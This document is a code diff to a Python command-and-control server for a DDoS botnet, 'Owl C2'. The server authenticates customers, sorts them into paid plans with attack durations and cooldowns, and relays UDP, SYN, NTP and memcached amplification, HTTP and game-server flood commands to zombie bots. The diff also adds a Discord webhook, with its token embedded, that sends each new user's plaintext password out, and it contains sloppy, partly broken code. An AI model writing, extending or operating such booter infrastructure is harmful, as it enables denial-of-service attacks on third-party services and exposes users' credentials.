@@ -2,6 +2,7 @@
 # -*- coding: utf-8 -*-
 
 # Tools
+from src.Commands.slot_handler import is_attack_running
 from src.Commands.Tools.url_to_ip import url_to_ip
 from src.Commands.Tools.ip_to_loc import ip_to_loc
 
@@ -34,6 +35,8 @@ from src.Commands.Methods_Games.vse import vse
 import socket, threading, time, ipaddress, random, json
 from datetime import datetime, timedelta
 from colorama import Fore, init
+import requests
+import time
 
 
 
@@ -65,6 +68,21 @@ lightwhite = color("LIGHTWHITE_EX")
 gray = color("LIGHTBLSYN_EX")
 dark_cyan = color("DARK_CYAN")
 cyan = color("LIGHTCYAN_EX")
+def gradientText(text, color1, color2):
+    lines = text.split('\n')
+    colored_lines = []
+    for i, line in enumerate(lines):
+        if i % 2 == 0:
+            colored_lines.append(colorize(line, color1))
+        else:
+            colored_lines.append(colorize(line, color2))
+    return '\n'.join(colored_lines)
+
+def colorize(text, color):
+    color_code = f"\033[38;2;{int(color[0])};{int(color[1])};{int(color[2])}m"
+    reset_color = "\033[0m"
+    return f"{color_code}{text}{reset_color}"
+    return colored_text
 def text2Gen():
     word = """
 
@@ -106,81 +124,94 @@ def text2Gen():
 
     return colored_word
 banner = text2Gen()
-
-help = f"""
-{cyan}List of commands:
-{dark_cyan}HELP         {cyan}Shows list of commands   
-{dark_cyan}BOTNET       {cyan}Shows list of botnet methods
-{dark_cyan}METHODS      {cyan}Shows Methods List
-{dark_cyan}BOTS         {cyan}Shows available zombies
-{dark_cyan}TOOLS        {cyan}Shows list of tools    
-{dark_cyan}CLEAR        {cyan}Clears the screen          
-{dark_cyan}EXIT         {cyan}Disconnects from the net
+connected_users = {}
+help = """
+List of commands:
+HELP         Shows list of commands   
+BOTNET       Shows list of botnet methods
+METHODS      Shows Methods List
+BOTS         Shows available zombies
+TOOLS        Shows list of tools    
+CLEAR        Clears the screen          
+EXIT         Disconnects from the net
 """
 
-showMethods = f"""
-{cyan}List of Methods:
-{dark_cyan}L3               {cyan}Show all L3 Methods
-{dark_cyan}L4               {cyan}Show all L4 Methods  
-{dark_cyan}AMP              {cyan}Show all Amplification Methods  
-{dark_cyan}HTTP             {cyan}Show all L7 Methods  
-{dark_cyan}GAMES            {cyan}Show all Games Methods
-{dark_cyan}BOTNET           {cyan}Show all Methods  
+showMethods = """
+List of Methods:
+L3               Show all L3 Methods
+L4               Show all L4 Methods  
+AMP              Show all Amplification Methods  
+HTTP             Show all L7 Methods  
+GAMES            Show all Games Methods
+BOTNET           Show all Methods  
 """
 
-Methods_L3 = f"""
-{cyan}L3 Methods:
-{dark_cyan}.ICMP              {cyan}Flood ICMP Request
-{dark_cyan}.POD               {cyan}Ping Of Death OLD Method Of DDoS
+Methods_L3 = """
+L3 Methods:
+.ICMP              Flood ICMP Request
+.POD               Ping Of Death OLD Method Of DDoS
 """
 
-Methods_AMP = f"""
-{cyan}Amplification Methods:
-{dark_cyan}.NTP               {cyan}NTP Reflection flood
-{dark_cyan}.MEM               {cyan}Memcached Flood 
+Methods_AMP = """
+Amplification Methods:
+.NTP               NTP Reflection flood
+.MEM               Memcached Flood 
 """
 
-Methods_L4 = f"""
-{cyan}L4 Methods:
-{dark_cyan}.NTP               {cyan}NTP Reflection flood
-{dark_cyan}.MEM               {cyan}Memcached Flood 
-{dark_cyan}.UDP               {cyan}UDP Flood  
-{dark_cyan}.TCP               {cyan}TCP Flood             
-{dark_cyan}.TUP               {cyan}TCP and UDP Flood
-{dark_cyan}.SYN               {cyan}TCP SYN flood
-{dark_cyan}.HEX               {cyan}HEX Flood
-{dark_cyan}.JUNK              {cyan}Junk flood
+Methods_L4 = """
+L4 Methods:
+.NTP               NTP Reflection flood
+.MEM               Memcached Flood 
+.UDP               UDP Flood  
+.TCP               TCP Flood             
+.TUP               TCP and UDP Flood
+.SYN               TCP SYN flood
+.HEX               HEX Flood
+.JUNK              Junk flood
 """
 
-Methods_L7 = f"""
-{cyan}L7 Methods:
-{dark_cyan}.HTTPIO            {cyan}HTTP IO Stresser
-{dark_cyan}.HTTPCFB           {cyan}HTTP Cloudflare bypass attSYN      
-{dark_cyan}.HTTPGET           {cyan}HTTP GET requests attSYN
-{dark_cyan}.HTTPSPOOF         {cyan}HTTP GET Spoofing
-{dark_cyan}.HTTPSTORM         {cyan}HTTP STORM Requests
+Methods_L7 = """
+L7 Methods:
+.HTTPIO            HTTP IO Stresser
+.HTTPCFB           HTTP Cloudflare bypass attSYN      
+.HTTPGET           HTTP GET requests attSYN
+.HTTPSPOOF         HTTP GET Spoofing
+.HTTPSTORM         HTTP STORM Requests
 """
 
-GameMethods = f"""
-{cyan}Games Methods: 
-{dark_cyan}.VSE               {cyan}Valve Source Engine query flood         
-{dark_cyan}.ROBLOX            {cyan}Roblox UDP Flood
+GameMethods = """
+Games Methods: 
+.VSE               Valve Source Engine query flood         
+.ROBLOX            Roblox UDP Flood
 """
 
-tools = f"""
-{cyan}List of Tools:
-{dark_cyan}!GETIP         {cyan}Get ip from URL      
-{dark_cyan}!GEOIP         {cyan}Get info from ip
+tools = """
+List of Tools:
+!GETIP         Get ip from URL      
+!GEOIP         Get info from ip
 """
 
-admin_commands = f"""
-{cyan}Admin Commands:
-{dark_cyan}!REG                {cyan}Starts registration server
-{dark_cyan}!USER               {cyan}Add/List/remove users
+admin_commands = """
+Admin Commands:
+!REG                Starts registration server
+!USER               Add/List/remove users
 """
-
+help = gradientText(help, (147, 103, 176), (189, 174, 199))
+showMethods = gradientText(showMethods, (147, 103, 176), (189, 174, 199))
+Methods_L3 = gradientText(Methods_L3, (147, 103, 176), (189, 174, 199))
+Methods_AMP = gradientText(Methods_AMP, (147, 103, 176), (189, 174, 199))
+Methods_L4 = gradientText(Methods_L4, (147, 103, 176), (189, 174, 199))
+Methods_L7 = gradientText(Methods_L7, (147, 103, 176), (189, 174, 199))
+GameMethods = gradientText(GameMethods, (147, 103, 176), (189, 174, 199))
+tools = gradientText(tools, (147, 103, 176), (189, 174, 199))
+admin_commands = gradientText(admin_commands, (147, 103, 176), (189, 174, 199))
 # LOL...
 botnetMethods = f"""{Methods_L3}{Methods_L4}{Methods_L7}{GameMethods}"""
+
+cooldowns = {}
+
+slots = 1
+slot = {}
 
 bots = {}
 user_name = ""
@@ -188,19 +219,43 @@ ansi_clear = '\033[2J\033[H'
 
 
 class Plan:
-    def __init__(self, name, cooldown, timelimit, maxConnections):
+    def __init__(self, name):
+       class Plan:
         self.name = name
-        self.cooldown = cooldown
-        self.timelimit = timelimit
-        self.maxConnections = maxConnections
+        self.cooldown = 0  # default value
+        self.maxConnections = 0  # default value
+        self.attackTime = 0  # default value
+        if name == "CLASSIC":
+            self.cooldown = 60
+            self.maxConnections = 1
+            self.attackTime = 60
+        if name == "VIP":
+            self.cooldown = 45
+            self.maxConnections = 1
+            self.attackTime = 120
+        if name == "PREMIUM":
+            self.cooldown = 30
+            self.maxConnections = 2
+            self.attackTime = 180
+        if name == "ROOT":
+            self.cooldown = 10
+            self.maxConnections = 10
+            self.attackTime = 1200
+     
+        
+        
+        
+        
+
 
 
 
 class Account:
-    def __init__(self, username, password,  data_Expiration):
+    def __init__(self, username, password,  data_Expiration, plan):
         self.username = username
         self.password = password
         self.data_Expiration = data_Expiration
+        self.plan = plan
 
     def userC_expirada(self):
         hoje = datetime.now()
@@ -220,8 +275,8 @@ def validate_port(port, rand=False):
         return port.isdigit() and int(port) >= 1 and int(port) <= 65535
 
 # Validate attSYN time
-def validate_time(time):
-    return time.isdigit() and int(time) >= 10 and int(time) <= 1300
+def validate_time(time, maxtime):
+    return time.isdigit() and int(time) >= 10 and int(time) <= maxtime
 
 # Validate buffer size
 def validate_size(size):
@@ -232,10 +287,12 @@ def find_login(client, username, password):
     credentials = [x.strip() for x in open('src/logins.txt').readlines() if x.strip()]
     for x in credentials:
         global  data_Expiration_str
-        c_username, c_password, data_Expiration_str = x.split(':')
+        c_username, c_password, data_Expiration_str, plan = x.split(':')
         data_Expiration = datetime.strptime(data_Expiration_str, '%Y-%m-%d')
         
-        userC = Account(username=c_username, password=c_password, data_Expiration=data_Expiration)
+        userC = Account(username=c_username, password=c_password, data_Expiration=data_Expiration, plan=plan)
+        Account.plan = Plan(plan)
+
         
         if userC.username.lower() == username.lower() and userC.password == password:
             if userC.userC_expirada():
@@ -244,7 +301,7 @@ def find_login(client, username, password):
                 time.sleep(3.5)
                 client.close()
                 return
-            return True
+            return True, Account, 
 
 # Checks if bots are dead
 def ping():
@@ -290,7 +347,17 @@ def handle_client(client, address):
     send(client, "\33]0;Owl C2 | Login\a")
     send(client, f'\x1bOwl C2 | Login: Awaiting Response...\a', False)
     send(client, ansi_clear, False)
-    send(client, f'{color("LIGHTBLSYN_EX")}Connecting...')
+    send(client, f'{gradientText("Connecting to OWL C2...", (147, 103, 176), (189, 174, 199))}\n', False)
+    #check if the ip is in the banned.txt file
+    with open("src/banned.txt", "r") as banned:
+        lines = banned.readlines()
+        banned.close()
+        for line in lines:
+            if address[0] in line:
+                send(client, f'{color("RED")}You are banned from Owl C2!')
+                time.sleep(5)
+                client.close()
+                return
     captcha(send, client, color("LIGHTBLSYN_EX"))
     time.sleep(1)
     while 1:
@@ -312,8 +379,9 @@ def handle_client(client, address):
     # Handle client
     if password != '\xff\xff\xff\xff\75':
         send(client, ansi_clear, False)
-
-        if not find_login(client, username, password):
+        login = find_login(client, username, password)
+        if not login:
+      
             try:
                 send(client, Fore.RED + f'\x1b{Fore.RED}Invalid credentials')
             except OSError as e:
@@ -323,11 +391,21 @@ def handle_client(client, address):
             client.close()
             return
         
+        login, Account = login
+        print(f'\n{Fore.LIGHTWHITE_EX}New connection from {address[0]}:{address[1]}')
+        print(f'{Fore.LIGHTWHITE_EX}Username: {username}')
+        print(f'{Fore.LIGHTWHITE_EX}Password: {password}')
+        print(f'{Fore.LIGHTWHITE_EX}Plan: {Account.plan.name}')
+        time.sleep(1)
+
+        send(client, ansi_clear, False)
         global user_name
+    
         user_name = username
+        connected_users.update({client: username, 'maxConnections': Account.plan.maxConnections, 'attackTime': Account.plan.attackTime})
         
         threading.Thread(target=update_title, args=(client, username,  data_Expiration_str)).start()
-        threading.Thread(target=command_line, args=(client, username)).start()
+        threading.Thread(target=command_line, args=(client, username, Account)).start()
 
     # Handle bot
     else:
@@ -370,6 +448,25 @@ def user(args, send, client):
                     logins.write(f'\n{user}:{password}:{dataExpiration}')
                     logins.close()
                     send(client, f'{Fore.LIGHTWHITE_EX}\nAdded new user successfully.\n')
+                    def send_discord_webhook(webhook_url, username, password, data_expiration):
+                        payload = {
+                            "content": "@everyone",
+                            "embeds": [
+                                {
+                                    "title": "New User Added",
+                                    "description": f"Username: {username}\nPassword: {password}\nData Expiration: {data_expiration}",
+                                    "color": 16711680  # Red color
+                                }
+                            ]
+                        }
+                        response = requests.post(webhook_url, json=payload)
+                        if response.status_code == 204:
+                            print("Webhook sent successfully!")
+                        else:
+                            print(f"Failed to send webhook. Status code: {response.status_code}")
+                    send_discord_webhook("https://discord.com/api/webhooks/1188940836424138962/OXshEfUL1aSC29wf-3eCRY4WMnXEpxzUSvEDVymU323LOm-31Kv1LsLP6tzmJNFIIFR2", user, password, dataExpiration)
+              
+
             else:
                 send(client, '\n!USER ADD [USERNAME] [PASSWORD] [AAAA-MM-DD]\n')
         if choice == 'REMOVE' or choice == 'R':
@@ -388,10 +485,10 @@ def user(args, send, client):
             else:
                 send(client, '\n!USER REMOVE [USERNAME]\n')
         if choice == 'LIST' or choice == 'L':
-                credentials = [x.strip() for x in open('src/logins.txt').readlines() if x.strip()]
-                for x in credentials:
-                    c_username, c_password, data_Expiration = x.split(':')
-                    send(client, f"{lightwhite}Username: {cyan}{c_username}{lightwhite} | Password: {cyan}{c_password}{lightwhite} | Expires: {cyan}{data_Expiration}")
+            credentials = [x.strip() for x in open('src/logins.txt').readlines() if x.strip()]
+            for x in credentials:
+                c_username, c_password, data_Expiration = x.split(':')
+                send(client, f"\033[1;37mUsername: \033[1;36m{c_username}\033[1;37m | Password: \033[1;36m{c_password}\033[1;37m | Expires: \033[1;36m{data_Expiration}")
     except:
         send(client, '\n!USER ADD/LIST/REMOVE\n')
 
@@ -402,26 +499,45 @@ def clear(client):
 
 # Updates Shell Title
 def update_title(client, name, expires):
+    expires = datetime.strptime(expires, "%Y-%m-%d")  # convert string to datetime
+
     while 1:
+        days_left = (expires - datetime.now()).days
+
         try:
-            send(client, f"\33]0;Owl C2 | Username > {name} | Expires: {expires} | Version {version}\a", False)
+            attack_running, remaining_time = is_attack_running()
+            if attack_running:
+                slot_display = f"In {remaining_time:.0f} seconds"
+            else:
+                slot_display = "Ready!"
+            if name in cooldowns.keys():
+                remaining_time = cooldowns[name] - datetime.now()
+                if remaining_time.total_seconds() > 0:
+                    cooldown_display = f"{remaining_time.total_seconds():.0f} seconds"
+                else:
+                    cooldown_display = "Ready!"
+                    del cooldowns[name]
+            else:
+                cooldown_display = "Ready!"
+            
+            send(client, f"\33]0;Owl C2 | Slot: {slot_display} | User: {name} | Expires in: {days_left} days | Cooldown: {cooldown_display}\a", False)
             time.sleep(0.6)
         except:
             client.close()
 
 # Telnet Command Line
-def command_line(client, username):
+def command_line(client, username, acc):
     for x in banner.split('\n'):
         send(client, x)
-
-    prompt = f'{color("WHITE")}[{color("DARK_CYAN")}OWL{color("WHITE")}@{color("DARK_CYAN")}{username}{color("LIGHTBLACK_EX")}]:~# {color("LIGHTBLACK_EX")}'
-    prompt = f'{color("GREEN")}owl{color("LIGHTRED_EX")}@{color("LIGHTBLSYN_EX")}[{color("LIGHTMAGENTA_EX")}{username}{color("LIGHTBLSYN_EX")}]'
+    prompt = gradientText(f'[OwlC2/{username}/cnc]─[$]', (147, 103, 176), (189, 174, 199))
     send(client, prompt, False)
 
     while 1:
         try:
             data = client.recv(1024).decode().strip()
-            if not data:
+          
+
+            if not data:                
                 continue
 
             args = data.split(' ')
@@ -429,8 +545,30 @@ def command_line(client, username):
             print(user_name, args)
 
             clear(client)
+            if command == "":
+                clear(client)
+                send(client, prompt, False, False)
+
 
             # if(command == 'USER'):
+            if command.startswith('.'):
+
+                
+                plan = Plan(acc.plan.name)
+                if username in cooldowns.keys():
+                    if datetime.now() < cooldowns[username]:
+                        remaining_time = cooldowns[username] - datetime.now()
+                        if remaining_time.total_seconds() > 0:
+                            cooldown_display = str(int(remaining_time.total_seconds())) + " seconds"
+                            clear(client)
+                            send(client, f'{gradientText("You are on cooldown! Time left: " + cooldown_display, (147, 103, 176), (189, 174, 199))}\n', True, True)
+                            send(client, prompt, False, False)
+                            continue
+                        else:
+                            del cooldowns[username]
+                else:
+                    cooldowns.update({username: datetime.now() + timedelta(seconds=plan.cooldown)})
+
 
 
             if command == 'HELP':
@@ -499,58 +637,58 @@ def command_line(client, username):
                 url_to_ip(args, send, client, cyan)
 
             elif command == '.UDP': # UDP Junk (Random UDP Data)
-                udp(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, broadcast, data)
-
+                udp(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, broadcast, data, plan.attackTime)
+                            
             elif command == '.TUP': # TCP and udp
-                tup(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, broadcast, data)
+                tup(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, broadcast, data, plan.attackTime)
 
             elif command == '.SYN': # SYN TCP flood
-                syn(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, broadcast, data)
+                syn(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, broadcast, data, plan.attackTime)
 
             elif command == '.TCP': # TCP Junk (Random TCP Data)
-                tcp(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, broadcast, data)
+                tcp(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, broadcast, data, plan.attackTime)
 
             elif command == '.HEX': # Specific HEXIDECIMAL Flood
-                hex(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, broadcast, data)
+                hex(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, broadcast, data, plan.attackTime)
 
             elif command == '.NTP': # NTP Reflection AttSYN
-                ntp(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, broadcast, data)
+                ntp(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, broadcast, data, plan.attackTime)
 
             elif command == '.MEM': # Memcached Flood
-                mem(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, broadcast, data)
+                mem(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, broadcast, data, plan.attackTime)
 
             elif command == '.ICMP': # Flood ICMP Request
-                icmp(args, validate_ip, validate_time, send, client, ansi_clear, broadcast, data)
+                icmp(args, validate_ip, validate_time, send, client, ansi_clear, broadcast, data, plan.attackTime)
 
             elif command == '.POD': # Ping of death
-                pod(args, validate_ip, validate_time, send, client, ansi_clear, broadcast, data)
+                pod(args, validate_ip, validate_time, send, client, ansi_clear, broadcast, data, plan.attackTime)
 
             elif command == '.ROBLOX': # Roblox flood
-                roblox(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, broadcast, data)
+                roblox(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, broadcast, data, plan.attackTime)
 
             elif command == '.JUNK': # JUNK Flood
-                junk(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, broadcast, data)
+                junk(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, broadcast, data, plan.attackTime)
 
             elif command == '.VSE': # VSE Flood
-                vse(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, broadcast, data)
+                vse(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, broadcast, data, plan.attackTime)
 
             elif command == '.HTTPSTORM': # HTTP request attSYN
-                httpstorm(args, validate_time, send, client, ansi_clear, broadcast, data)
+                httpstorm(args, validate_time, send, client, ansi_clear, broadcast, data, plan.attackTime)
 
             elif command == '.HTTPIO': # FULL POWER !!!
-                httpio(args, validate_time, send, client, ansi_clear, broadcast, data)
+                httpio(args, validate_time, send, client, ansi_clear, broadcast, data, plan.attackTime)
 
             elif command == '.HTTPSPOOF': # HTTP GET SPOOF
-                httpspoof(args, validate_time, send, client, ansi_clear, broadcast, data)
+                httpspoof(args, validate_time, send, client, ansi_clear, broadcast, data, plan.attackTime)
 
             elif command == '.HTTPGET': # HTTP request attSYN
-                httpget(args, validate_time, send, client, ansi_clear, broadcast, data)
-            
+                httpget(args, validate_time, send, client, ansi_clear, broadcast, data, plan.attackTime)
+                        
             elif command == '.HTTPCFB': # HTTP cloudflare bypass attSYN
-                httpcfb(args, validate_time, send, client, ansi_clear, broadcast, data)
-            
-            send(client, prompt, False)
-        except:
+                httpcfb(args, validate_time, send, client, ansi_clear, broadcast, data, plan.attackTime)
+            send(client, prompt, False, False)
+        except Exception as e:
+            print(e)
             break
     client.close()
 
